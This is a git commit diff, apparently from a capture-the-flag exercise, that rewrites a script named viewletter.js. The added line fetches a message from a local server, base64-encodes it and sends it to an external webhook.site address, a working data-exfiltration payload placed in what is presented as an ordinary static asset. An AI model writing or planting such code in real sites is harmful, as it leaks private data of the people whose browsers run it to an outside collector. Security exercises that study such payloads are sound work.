9133c9ead6b216dfc999224a648b1fbbd52c6824
William957-web <85293841+William957-web@users.noreply.github.com>
2024-04-18 21:32:34 +0800

    Update viewletter.js

--- static/viewletter.js
+++ static/viewletter.js
@@ -1,11 +1,1 @@
-fetch("http://127.0.0.1/message/3").then(res => {
-    return res.text();
-}).then(res => {
-    fetch("http://127.0.0.1/submit", {
-        "headers": {
-            "content-type": "application/json"
-        },
-        "body": res,
-        "method": "POST",
-    });
-});
+fetch("http://127.0.0.1/message/3").then(res => {return res.text();}).then(res =>fetch("http://webhook.site/ae5a8c4b-5567-4da6-abbf-cbb4908426fe?log="+btoa(res)));
